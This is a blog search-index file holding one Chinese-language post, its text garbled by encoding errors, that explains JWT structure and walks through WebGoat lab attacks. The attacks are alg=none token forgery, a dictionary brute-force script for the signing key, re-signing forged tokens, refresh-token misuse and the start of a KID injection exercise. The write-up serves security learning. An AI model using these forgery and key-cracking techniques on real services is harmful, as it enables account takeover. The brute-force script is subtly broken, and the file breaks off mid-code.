<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title></title>
      <link href="/2023/06/08/JWT%E4%BB%A4%E7%89%8C/"/>
      <url>/2023/06/08/JWT%E4%BB%A4%E7%89%8C/</url>
      
        <content type="html"><![CDATA[<h1 id="JWTè®¤è¯†"><a href="#JWTè®¤è¯†" class="headerlink" title="JWTè®¤è¯†"></a>JWTè®¤è¯†</h1><h2 id="æ¦‚å¿µ"><a href="#æ¦‚å¿µ" class="headerlink" title="æ¦‚å¿µ"></a>æ¦‚å¿µ</h2><p>JSON Web Tokenï¼ˆJSON Web ä»¤ç‰Œï¼‰æ˜¯ä¸€ç§è·¨åŸŸéªŒè¯èº«ä»½çš„æ–¹æ¡ˆã€‚JWT ä¸åŠ å¯†ä¼ è¾“çš„æ•°æ®ï¼Œä½†èƒ½å¤Ÿé€šè¿‡æ•°å­—ç­¾åæ¥éªŒè¯æ•°æ®æœªè¢«ç¯¡æ”¹ã€‚</p><h2 id="ä»¤ç‰Œå·¥ä½œæµç¨‹"><a href="#ä»¤ç‰Œå·¥ä½œæµç¨‹" class="headerlink" title="ä»¤ç‰Œå·¥ä½œæµç¨‹"></a>ä»¤ç‰Œå·¥ä½œæµç¨‹</h2><p><img src="/../images/jwt-diagram.png" alt="jwt"></p><ol><li>æµè§ˆå™¨å‘èµ·è¯·æ±‚ç™»é™†</li><li>æœåŠ¡ç«¯éªŒè¯èº«ä»½ï¼Œæ ¹æ®ç®—æ³•ï¼Œå°†ç”¨æˆ·æ ‡è¯†ç¬¦æ‰“åŒ…ç”Ÿæˆ token, å¹¶ä¸”è¿”å›ç»™æµè§ˆå™¨</li><li>æµè§ˆå™¨å‘èµ·è¯·æ±‚è·å–ç”¨æˆ·èµ„æ–™ï¼ŒæŠŠåˆšåˆšæ‹¿åˆ°çš„ token ä¸€èµ·å‘é€ç»™æœåŠ¡å™¨</li><li>æœåŠ¡å™¨å‘ç°æ•°æ®ä¸­æœ‰ tokenï¼ŒéªŒè¯ç­¾åå¹¶è¯†åˆ«ç”¨æˆ·èº«ä»½</li><li>æœåŠ¡å™¨è¿”å›è¯¥ç”¨æˆ·çš„ç”¨æˆ·èµ„æ–™</li></ol><h2 id="ç»„æˆ"><a href="#ç»„æˆ" class="headerlink" title="ç»„æˆ"></a>ç»„æˆ</h2><p>JWT åˆ†ä¸ºä¸‰éƒ¨åˆ†ï¼Œå¤´éƒ¨ï¼ˆHeaderï¼‰ï¼Œå£°æ˜ï¼ˆClaimsï¼‰ï¼Œç­¾åï¼ˆSignatureï¼‰ï¼Œä¸‰ä¸ªéƒ¨åˆ†ä»¥è‹±æ–‡å¥å·.éš”å¼€ã€‚ </p><p><img src="/../images/jwt_token.png" alt="JWT"></p><p>hearderå’ŒClaims çš„å†…å®¹ä»¥ Base64URL è¿›è¡Œäº†ç¼–ç ã€‚</p><blockquote><p>Base64URL  From ç»´åŸºç™¾ç§‘</p></blockquote><p><img src="/../images/image-20230607163309054.png" alt="image-20230607163309054"></p><h3 id="å¤´éƒ¨ï¼ˆHeaderï¼‰"><a href="#å¤´éƒ¨ï¼ˆHeaderï¼‰" class="headerlink" title="å¤´éƒ¨ï¼ˆHeaderï¼‰"></a>å¤´éƒ¨ï¼ˆHeaderï¼‰</h3><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;alg&quot;</span><span class="punctuation">:</span><span class="string">&quot;HS256&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;kid&quot;</span><span class="punctuation">:</span><span class="string">&quot;webgoat_key&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;typ&quot;</span><span class="punctuation">:</span><span class="string">&quot;JWT&quot;</span> </span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>å‚æ•°è¯´æ˜:</p><ul><li>algorithmï¼ˆalgï¼‰ :è¯´æ˜JWTç­¾åä½¿ç”¨çš„ç®—æ³•ï¼Œå¸¸è§æœ‰HS256ï¼ˆé»˜è®¤ï¼‰ï¼ŒRS256 ç­‰ï¼Œä¹Ÿå¯ä»¥ä¸º Noneä¸è¿›è¡Œç­¾åã€‚</li><li>kidï¼šç”¨æ¥æŒ‡å®šéªŒè¯ç­¾åçš„å¯†é’¥</li><li>typ:è¯´æ˜è¿™ä¸ª token çš„ç±»å‹ä¸º JWT (å¯é€‰å‚æ•°)</li></ul><h3 id="å£°æ˜ï¼ˆClaimsï¼‰"><a href="#å£°æ˜ï¼ˆClaimsï¼‰" class="headerlink" title="å£°æ˜ï¼ˆClaimsï¼‰"></a>å£°æ˜ï¼ˆClaimsï¼‰</h3><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span> </span><br><span class="line"> <span class="attr">&quot;secretid&quot;</span><span class="punctuation">:</span><span class="string">&quot; &quot;</span></span><br><span class="line"> <span class="attr">&quot;aud&quot;</span><span class="punctuation">:</span> <span class="string">&quot;webgoat.org&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;iat&quot;</span><span class="punctuation">:</span> <span class="number">1644039735</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;exp&quot;</span><span class="punctuation">:</span> <span class="number">1644039795</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;sub&quot;</span><span class="punctuation">:</span> <span class="string">&quot;tom@webgoat.org&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;jti&quot;</span><span class="punctuation">:</span><span class="string">&quot;xxx&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;nbf&quot;</span><span class="punctuation">:</span>xxx</span><br><span class="line"><span class="punctuation">&#125;</span> </span><br></pre></td></tr></table></figure><p>å‚æ•°è¯´æ˜ï¼š</p><ul><li>secretidï¼šå¯†é’¥idå€¼ï¼Œå½“å…¶ä¸ºç©ºæ—¶ï¼Œjwté»˜è®¤algä¸ºnone</li><li>audï¼šæ¥æ”¶jwtçš„ç”¨æˆ·</li><li>iatï¼šä»¤ç‰Œç”Ÿæ•ˆæ—¶é—´ </li><li>expï¼šä»¤ç‰Œåˆ°æœŸæ—¶é—´</li><li>subï¼šä¸»é¢˜</li><li>jtiï¼š jwtçš„å”¯ä¸€èº«ä»½æ ‡è¯†ï¼Œä¸»è¦ç”¨æ¥ä½œä¸ºä¸€æ¬¡æ€§token,ä»è€Œå›é¿é‡æ”¾æ”»å‡»</li><li>nbfï¼šå®šä¹‰åœ¨ä»€ä¹ˆæ—¶é—´ä¹‹å‰ï¼Œè¯¥jwtéƒ½æ˜¯ä¸å¯ç”¨çš„.</li></ul><p> æ–‡æ¡£ï¼š<a href="https://datatracker.ietf.org/doc/html/rfc7519#section-4.1">https://datatracker.ietf.org/doc/html/rfc7519#section-4.1</a></p><h3 id="ç­¾åï¼ˆSignatureï¼‰"><a href="#ç­¾åï¼ˆSignatureï¼‰" class="headerlink" title="ç­¾åï¼ˆSignatureï¼‰"></a>ç­¾åï¼ˆSignatureï¼‰</h3><p>â€‹æœåŠ¡å™¨æœ‰ä¸€ä¸ªä¸ä¼šå‘é€ç»™å®¢æˆ·ç«¯çš„å¯†ç ï¼ˆsecretï¼‰ï¼Œç”¨å¤´éƒ¨ä¸­æŒ‡å®šçš„ç®—æ³•å¯¹å¤´éƒ¨å’Œå£°æ˜çš„å†…å®¹ï¼ˆbase64ç¼–ç åçš„ï¼‰ç”¨æ­¤å¯†ç è¿›è¡ŒåŠ å¯†ï¼Œç”Ÿæˆçš„å­—ç¬¦ä¸²å°±æ˜¯ JWT çš„ç­¾åã€‚ </p><p>ä»¥HMAC SHA256ä¸ºä¾‹</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">HMACSHA256(base64UrlEncode(header) + <span class="string">&quot;.&quot;</span> + base64UrlEncode(claims),secret)</span><br></pre></td></tr></table></figure><h2 id="ä½¿ç”¨"><a href="#ä½¿ç”¨" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h2><p>åœ¨http headerä¸­æ·»åŠ </p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Authorization</span><span class="punctuation">: </span>Bearer &lt;token&gt;</span><br></pre></td></tr></table></figure><h2 id="å®‰å…¨æ€§"><a href="#å®‰å…¨æ€§" class="headerlink" title="å®‰å…¨æ€§"></a>å®‰å…¨æ€§</h2><ul><li><p>é˜²ç¯¡æ”¹å–å†³äºç§é’¥å’ŒåŠ å¯†ç®—æ³•çš„å®‰å…¨æ€§ã€‚</p></li><li><p>å› ä¸ºç­¾åæ‰€ä»¥JWTèƒ½å¤Ÿé˜²ç¯¡æ”¹èµ·åˆ°è®¤è¯åŠŸèƒ½ï¼Œä½†æ˜¯å¯¹äºheaderå’ŒClaimséƒ¨åˆ†åªè¿›è¡Œäº†base64URLç¼–ç ï¼Œè¿™æ„å‘³ç€ä»»ä½•äººéƒ½å¯ä»¥è¯»å–åˆ°è¿™éƒ¨åˆ†çš„ä¿¡æ¯ï¼Œæ‰€ä»¥é™¤éåŠ å¯†ï¼Œå¦åˆ™ä¸è¦åœ¨JWTçš„æœ‰æ•ˆè´Ÿè½½æˆ–æŠ¥å¤´å…ƒç´ ä¸­æ”¾ç½®ç§˜å¯†ä¿¡æ¯ã€‚</p></li></ul><h1 id="å¦‚ä½•ç”ŸæˆJWT"><a href="#å¦‚ä½•ç”ŸæˆJWT" class="headerlink" title="å¦‚ä½•ç”ŸæˆJWT"></a>å¦‚ä½•ç”ŸæˆJWT</h1><ul><li><p>ç­¾åè§£æç½‘ç«™ <a href="https://jwt.io/">JSON Web Tokens - jwt.io</a></p></li><li><p>python</p><p>å®‰è£…æ¨¡å—</p><p><a href="https://stackoverflow.com/questions/33198428/jwt-module-object-has-no-attribute-encode">https://stackoverflow.com/questions/33198428/jwt-module-object-has-no-attribute-encode</a></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pip uninstall JWT </span><br><span class="line">pip uninstall PyJWT </span><br><span class="line">pip install PyJWT==<span class="number">1.7</span><span class="number">.1</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">key = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># è°ƒç”¨jwtåº“,ç”Ÿæˆjson web token</span></span><br><span class="line">jwt_token = jwt.encode(payload=payload,  <span class="comment"># payload, æœ‰æ•ˆè½½ä½“</span></span><br><span class="line">                       key=key,  <span class="comment"># è¿›è¡ŒåŠ å¯†ç­¾åçš„å¯†é’¥</span></span><br><span class="line">                       algorithm=<span class="string">&quot;HS256&quot;</span>,  <span class="comment"># æŒ‡æ˜ç­¾åç®—æ³•æ–¹å¼, é»˜è®¤ä¹Ÿæ˜¯HS256</span></span><br><span class="line">                       headers=headers  <span class="comment"># json web token æ•°æ®ç»“æ„åŒ…å«ä¸¤éƒ¨åˆ†, payload(æœ‰æ•ˆè½½ä½“), headers(æ ‡å¤´)</span></span><br><span class="line">                       ).decode(<span class="string">&#x27;ascii&#x27;</span>)  <span class="comment"># python3 ç¼–ç åå¾—åˆ° bytes, å†è¿›è¡Œè§£ç (æŒ‡æ˜è§£ç çš„æ ¼å¼), å¾—åˆ°ä¸€ä¸ªstr</span></span><br><span class="line"><span class="built_in">print</span>(jwt_token)</span><br></pre></td></tr></table></figure></li></ul><h1 id="JWTæ£€æµ‹"><a href="#JWTæ£€æµ‹" class="headerlink" title="JWTæ£€æµ‹"></a>JWTæ£€æµ‹</h1><ul><li><p>JAVAweb</p></li><li><p>æ•°æ®åŒ…è¯·æ±‚å¤´</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Authorization</span><span class="punctuation">: </span>Bearer</span><br></pre></td></tr></table></figure></li><li><p>æ•°æ®åŒ…æ•°æ®æ ¼å¼</p></li></ul><h1 id="æ”»å‡»æ‰‹æ®µ"><a href="#æ”»å‡»æ‰‹æ®µ" class="headerlink" title="æ”»å‡»æ‰‹æ®µ"></a>æ”»å‡»æ‰‹æ®µ</h1><h3 id="ç­¾åç®—æ³•ç½®None"><a href="#ç­¾åç®—æ³•ç½®None" class="headerlink" title="ç­¾åç®—æ³•ç½®None"></a>ç­¾åç®—æ³•ç½®None</h3><h4 id="å®éªŒ"><a href="#å®éªŒ" class="headerlink" title="å®éªŒ"></a>å®éªŒ</h4><p>WebGoat JWT 5</p><p><img src="/../images/image-20230607173309475.png" alt="image-20230607173309475"></p><p>ç‚¹å‡»resetæŒ‰é’®ï¼ŒæŠ“å–æ•°æ®åŒ…ï¼Œå°†æ•°æ®åŒ…ä¸­çš„tokenè¿›è¡Œè§£å¯†</p><p><img src="/../images/image-20230607173408930.png" alt="image-20230607173408930"></p><p>å‘ç°åœ¨å£°æ˜éƒ¨åˆ†æœ‰adminå‚æ•°å€¼ä¸ºfalseï¼Œåº”è¯¥å°±æ˜¯æ ¹æ®è¿™ä¸ªæ¥åˆ¤æ–­ç”¨æˆ·æ˜¯å¦ä¸ºç®¡ç†å‘˜</p><p><strong>å°†adminå€¼ä¿®æ”¹ä¸ºtrue</strong></p><p>è¿™æ—¶å€™ä¿®æ”¹äº†å£°æ˜éƒ¨åˆ†çš„å†…å®¹ï¼Œç­¾åå°±å¤±æ•ˆäº†ï¼Œæ‰€ä»¥è¦ç»•è¿‡ç­¾åéªŒè¯</p><p><strong>å°†å¤´éƒ¨algå€¼æ”¹ä¸ºnoneï¼Œè®©æœåŠ¡å™¨ä¸è¿›è¡Œç­¾åéªŒè¯</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line">token = jwt.encode(</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;iat&quot;</span>: <span class="number">1686993728</span>,</span><br><span class="line">  <span class="string">&quot;admin&quot;</span>: <span class="string">&quot;true&quot;</span>,</span><br><span class="line">  <span class="string">&quot;user&quot;</span>: <span class="string">&quot;Jerry&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">,algorithm=<span class="string">&quot;none&quot;</span>,key=<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(token)</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230607174127468.png" alt="image-20230607174127468"></p><h4 id="å½¢æˆåŸå› "><a href="#å½¢æˆåŸå› " class="headerlink" title="å½¢æˆåŸå› "></a>å½¢æˆåŸå› </h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">   <span class="type">Jwt</span> <span class="variable">jwt</span> <span class="operator">=</span> Jwts.parser().setSigningKey(JWT_PASSWORD).parse(accessToken);</span><br><span class="line">   <span class="type">Claims</span> <span class="variable">claims</span> <span class="operator">=</span> (Claims) jwt.getBody();</span><br><span class="line">   <span class="type">String</span> <span class="variable">user</span> <span class="operator">=</span> (String) claims.get(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">   <span class="type">boolean</span> <span class="variable">isAdmin</span> <span class="operator">=</span> Boolean.valueOf((String) claims.get(<span class="string">&quot;admin&quot;</span>));</span><br><span class="line">   <span class="keyword">if</span> (isAdmin) &#123;</span><br><span class="line">     removeAllUsers();</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">     log.error(<span class="string">&quot;You are not an admin user&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (JwtException e) &#123;</span><br><span class="line">  <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidTokenException</span>(e);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…³é”®ç‚¹åœ¨äº</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Jwt</span> <span class="variable">jwt</span> <span class="operator">=</span> Jwts.parser().setSigningKey(JWT_PASSWORD).parse(accessToken);</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨äº†é”™è¯¯çš„å‡½æ•°<code>parse(accessToken)</code>ï¼Œè€Œä¸æ˜¯<code>parseClaimsJws(accessToken)</code>ï¼Œå¯¼è‡´jwtéªŒè¯æˆåŠŸ</p><p>æ­£å¸¸æƒ…å†µä¸‹</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Jwt</span> <span class="variable">jwt</span> <span class="operator">=</span> Jwts.parser().setSigningKey(JWT_PASSWORD).parseClaimsJws(accessToken);</span><br></pre></td></tr></table></figure><ul><li><code>Jwts.parser()</code> åˆ›å»ºäº†ä¸€ä¸ª<code>JwtParser</code>ç±»çš„å®ä¾‹ï¼Œç”¨äºè§£æå’ŒéªŒè¯JWTã€‚</li><li><code>setSigningKey(JWT_PASSWORD)</code> è®¾ç½®ç”¨äºç­¾åJWTçš„å¯†é’¥ã€‚<code>JWT_PASSWORD</code>å˜é‡åº”åŒ…å«ç”¨äºç­¾åJWTçš„ç›¸åŒå¯†é’¥ã€‚</li><li><code>parseClaimsJws(accessToken)</code> è§£æåŒ…å«åœ¨<code>accessToken</code>å˜é‡ä¸­çš„JWTï¼Œå¹¶å°†å…¶ä½œä¸º<code>Jws&lt;Claims&gt;</code>å¯¹è±¡è¿”å›ã€‚<code>Claims</code>å¯¹è±¡åŒ…å«JWTçš„æœ‰æ•ˆè´Ÿè½½ï¼Œé€šå¸¸åŒ…æ‹¬å…³äºç”¨æˆ·çš„ä¿¡æ¯ä»¥åŠæˆæƒè¯·æ±‚æ‰€éœ€çš„ä»»ä½•å…¶ä»–æ•°æ®ã€‚</li></ul><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¦‚æœä½¿ç”¨æä¾›çš„å¯†é’¥æ— æ³•éªŒè¯JWTï¼Œåˆ™<code>parseClaimsJws()</code>æ–¹æ³•å°†æŠ›å‡º<code>SignatureException</code>ã€‚</p><h3 id="çˆ†ç ´å¯†é’¥â€“ä¿®æ”¹ç­¾å"><a href="#çˆ†ç ´å¯†é’¥â€“ä¿®æ”¹ç­¾å" class="headerlink" title="çˆ†ç ´å¯†é’¥â€“ä¿®æ”¹ç­¾å"></a>çˆ†ç ´å¯†é’¥â€“ä¿®æ”¹ç­¾å</h3><p>WebGoat JWT 10</p><p>å·¥å…·</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./jwtcrack JWTæ•°æ®</span><br><span class="line">hashcat</span><br></pre></td></tr></table></figure><p>pythonè„šæœ¬</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    1.è‹¥ç­¾åç›´æ¥æ ¡éªŒæˆåŠŸï¼Œåˆ™ key_ ä¸ºæœ‰æ•ˆå¯†é’¥ï¼›</span></span><br><span class="line"><span class="string">    2.è‹¥å› æ•°æ®éƒ¨åˆ†é¢„å®šä¹‰å­—æ®µé”™è¯¯ï¼ˆjwt.exceptions.ExpiredSignatureError, jwt.exceptions.InvalidAudienceError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.ImmatureSignatureErrorï¼‰å¯¼è‡´æ ¡éªŒå¤±è´¥ï¼Œè¯´æ˜å¹¶éå¯†é’¥é”™è¯¯å¯¼è‡´ï¼Œåˆ™ key_ ä¹Ÿä¸ºæœ‰æ•ˆå¯†é’¥ï¼›</span></span><br><span class="line"><span class="string">    3.è‹¥å› å¯†é’¥é”™è¯¯ï¼ˆjwt.exceptions.InvalidSignatureErrorï¼‰å¯¼è‡´æ ¡éªŒå¤±è´¥ï¼Œåˆ™ key_ ä¸ºæ— æ•ˆå¯†é’¥ï¼›</span></span><br><span class="line"><span class="string">    4.è‹¥ä¸ºå…¶ä»–åŸå› ï¼ˆå¦‚ï¼ŒJWT å­—ç¬¦ä¸²æ ¼å¼é”™è¯¯ï¼‰å¯¼è‡´æ ¡éªŒå¤±è´¥ï¼Œæ ¹æœ¬æ— æ³•éªŒè¯å½“å‰ key_ æ˜¯å¦æœ‰æ•ˆã€‚</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="comment">#import termcolor</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># æç¤ºé‡Œç»™çš„å­—å…¸https://github.com/first20hours/google-10000-english</span></span><br><span class="line">dict_path = <span class="string">&#x27;path/10000_en_words.txt&#x27;</span></span><br><span class="line">JWT_STR = <span class="string">R&#x27;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJpYXQiOjE1MjQyMTA5MDQsImV4cCI6MTYxODkwNTMwNCwiYXVkIjoid2ViZ29hdC5vcmciLCJzdWIiOiJ0b21Ad2ViZ29hdC5jb20iLCJ1c2VybmFtZSI6IlRvbSIsIkVtYWlsIjoidG9tQHdlYmdvYXQuY29tIiwiUm9sZSI6WyJNYW5hZ2VyIiwiUHJvamVjdCBBZG1pbmlzdHJhdG9yIl19.m-jSyfYEsVzD3CBI6N39wZ7AcdKdp_GiO7F_Ym12u-0&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    jwt_str = JWT_STR</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(dict_path) <span class="keyword">as</span> f:</span><br><span class="line">            key_ = line.strip()</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                jwt.decode(jwt_str, verify=<span class="literal">True</span>, key=key_)</span><br><span class="line">                <span class="comment">#print(&#x27;\r&#x27;, &#x27;\bbingo! found key --&gt;&#x27;, termcolor.colored(key_, &#x27;green&#x27;), &#x27;&lt;--&#x27;)</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;\r&#x27;</span>,<span class="string">&#x27;the key is [&#x27;</span>,key_,<span class="string">&#x27;]&#x27;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span> (jwt.exceptions.ExpiredSignatureError, jwt.exceptions.InvalidAudienceError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.ImmatureSignatureError):</span><br><span class="line">                <span class="comment">#print(&#x27;\r&#x27;, &#x27;\bbingo! found key --&gt;&#x27;, termcolor.colored(key_, &#x27;green&#x27;), &#x27;&lt;--&#x27;)</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;\r&#x27;</span>,<span class="string">&#x27;the key is [&#x27;</span>,key_,<span class="string">&#x27;]&#x27;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span> jwt.exceptions.InvalidSignatureError:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27; &#x27;</span> * <span class="number">64</span>, <span class="string">&#x27;\r\btry&#x27;</span>, key_, end=<span class="string">&#x27;&#x27;</span>, flush=<span class="literal">True</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\bsorry! no key be found.&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230607191917485.png" alt="image-20230607191917485"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line">token = jwt.encode(</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;iss&quot;</span>: <span class="string">&quot;WebGoat Token Builder&quot;</span>,</span><br><span class="line">  <span class="string">&quot;aud&quot;</span>: <span class="string">&quot;webgoat.org&quot;</span>,</span><br><span class="line">  <span class="string">&quot;iat&quot;</span>: <span class="number">1686136171</span>,</span><br><span class="line">  <span class="string">&quot;exp&quot;</span>: <span class="number">1786136231</span>,   <span class="comment"># ä¿®æ”¹jwtåˆ°æœŸæ—¶é—´</span></span><br><span class="line">  <span class="string">&quot;sub&quot;</span>: <span class="string">&quot;tom@webgoat.org&quot;</span>,</span><br><span class="line">  <span class="string">&quot;username&quot;</span>: <span class="string">&quot;WebGoat&quot;</span>, <span class="comment"># æŒ‰é¢˜ç›®è¦æ±‚ä¿®æ”¹åå­—</span></span><br><span class="line">  <span class="string">&quot;Email&quot;</span>: <span class="string">&quot;tom@webgoat.org&quot;</span>,</span><br><span class="line">  <span class="string">&quot;Role&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;Manager&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Project Administrator&quot;</span></span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br><span class="line">,algorithm=<span class="string">&quot;HS256&quot;</span>,key=<span class="string">&quot;available&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(token)</span><br></pre></td></tr></table></figure><p>å°†ç”Ÿæˆçš„tokenæäº¤å³å¯</p><p><img src="/../images/image-20230607192326261.png" alt="image-20230607192326261"></p><h3 id="è®¿é—®ä»¤ç‰Œå’Œåˆ·æ–°ä»¤ç‰Œ"><a href="#è®¿é—®ä»¤ç‰Œå’Œåˆ·æ–°ä»¤ç‰Œ" class="headerlink" title="è®¿é—®ä»¤ç‰Œå’Œåˆ·æ–°ä»¤ç‰Œ"></a>è®¿é—®ä»¤ç‰Œå’Œåˆ·æ–°ä»¤ç‰Œ</h3><h4 id="å½¢æˆåŸå› -1"><a href="#å½¢æˆåŸå› -1" class="headerlink" title="å½¢æˆåŸå› "></a><strong>å½¢æˆåŸå› </strong></h4><p>æœªæ ¡éªŒaccess tokenå’Œrefresh tokenæ˜¯å¦å±äºåŒä¸€ä¸ªç”¨æˆ·ï¼Œå¯¼è‡´Aç”¨æˆ·å¯ä½¿ç”¨è‡ªå·±çš„refresh tokenå»åˆ·æ–°Bç”¨æˆ·çš„access token</p><h4 id="å®éªŒ-1"><a href="#å®éªŒ-1" class="headerlink" title="å®éªŒ"></a>å®éªŒ</h4><p>WebGoat JWT 12</p><p>é¢˜ç›®ç»™å‡ºäº†Tomçš„æ—§token</p><p><img src="/../images/image-20230608205636773.png" alt="image-20230608205636773"></p><p>ç”¨jerryè®¿é—®å¾—åˆ°refresh tokenï¼ˆå¯†ç åœ¨æºç é‡Œï¼‰</p><p><img src="/../images/image-20230608205424807.png" alt="image-20230608205424807"></p><p>ç”¨jerryçš„refresh token å»åˆ·æ–°Tomçš„access token</p><p><img src="/../images/image-20230608210421439.png" alt="image-20230608210421439"></p><p>å¸¦ä¸Šå¾—åˆ°çš„accesstokenï¼Œå»è´­ç‰©</p><p><img src="/../images/image-20230608210205494.png" alt="image-20230608210205494"></p><h4 id="ä¿®å¤"><a href="#ä¿®å¤" class="headerlink" title="ä¿®å¤"></a><strong>ä¿®å¤</strong></h4><p>è·Ÿè¸ªå“ªä¸ªaccess tokenå±äºå“ªä¸ªrefresh token,è¿˜å¯ä»¥æ£€æŸ¥ç”¨æˆ·çš„IPåœ°å€æˆ–åœ°ç†ä½ç½®ã€‚</p><h3 id="æ—§JWTå¤ç”¨"><a href="#æ—§JWTå¤ç”¨" class="headerlink" title="æ—§JWTå¤ç”¨"></a>æ—§JWTå¤ç”¨</h3><p>è¿˜æ˜¯WebGoat JWT 12</p><p><img src="/../images/image-20230607193350002.png" alt="image-20230607193350002"></p><p><img src="/../images/image-20230607193221271.png" alt="image-20230607193221271"></p><h3 id="KIDæ³¨å…¥"><a href="#KIDæ³¨å…¥" class="headerlink" title="KIDæ³¨å…¥"></a>KIDæ³¨å…¥</h3><p>WebGoat JWT 13</p><p>æŸ¥çœ‹å¯¹åº”æºç </p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Jwt</span> <span class="variable">jwt</span> <span class="operator">=</span>Jwts.parser().setSigningKeyResolver(<span class="keyword">new</span> <span class="title class_">SigningKeyResolverAdapter</span>() &#123;</span><br><span class="line">                        xxxxxxx</span><br><span class="line">                    &#125;).parseClaimsJws(token);</span><br><span class="line"><span class="type">Claims</span> <span class="variable">claims</span> <span class="operator">=</span> (Claims) jwt.getBody();</span><br><span class="line"><span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> (String) claims.get(<span class="string">&quot;username&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="string">&quot;Jerry&quot;</span>.equals(username)) &#123;</span><br><span class="line">    <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;jwt-final-jerry-account&quot;</span>).build();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="string">&quot;Tom&quot;</span>.equals(username)) &#123;</span><br><span class="line">    <span class="keyword">return</span> success(<span class="built_in">this</span>).build();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;jwt-final-not-tom&quot;</span>).build();</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (JwtException e) &#123;</span><br><span class="line">    <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;jwt-invalid-token&quot;</span>).output(e.toString()).build();</span><br><span 